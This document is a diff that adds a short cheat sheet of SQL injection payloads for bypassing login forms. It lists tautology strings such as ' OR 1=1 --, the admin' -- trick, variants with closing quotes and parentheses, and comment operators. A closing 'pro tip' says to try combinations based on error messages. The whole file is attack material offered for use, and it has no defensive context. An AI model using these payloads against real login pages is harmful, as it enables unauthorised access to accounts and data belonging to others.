@@ -1,0 +1,19 @@
+🚀 Common SQL Injection Payloads (Login Bypass)
+
+🔥 Basic Payloads:
+' OR 1=1 --
+' OR '1'='1 --
+' OR '1'='1' --
+admin' --
+' OR 'a'='a
+
+🔧 With Different Closures:
+') OR 1=1 --
+") OR 1=1 --
+
+💬 Useful Comment Operators:
+--
+#
+/* */
+
+📌 Pro Tip: Try different combinations based on the error messages.
